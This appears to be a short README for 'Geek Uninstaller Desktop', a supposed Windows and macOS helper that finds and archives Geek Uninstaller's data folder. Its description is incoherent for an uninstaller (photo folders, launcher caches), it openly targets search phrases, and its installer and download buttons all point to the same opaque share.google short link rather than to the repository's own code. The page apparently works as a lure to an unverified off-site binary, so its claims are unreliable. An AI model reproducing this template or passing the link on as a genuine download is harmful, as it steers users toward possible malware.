![Geek Uninstaller Desktop](assets/hero.png)

# Geek Uninstaller Desktop

*Find the Geek Uninstaller folder fast and keep a local spare.*

## Overview

**Geek Uninstaller Desktop** runs on your own PC. Local Windows and macOS helper for Geek Uninstaller data paths, config and export caches, and export folders.

Geek Uninstaller drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Finds the Geek Uninstaller data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Geek Uninstaller desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/grussell242/geek-uninstaller-desktop

MIT license. See `LICENSE`.
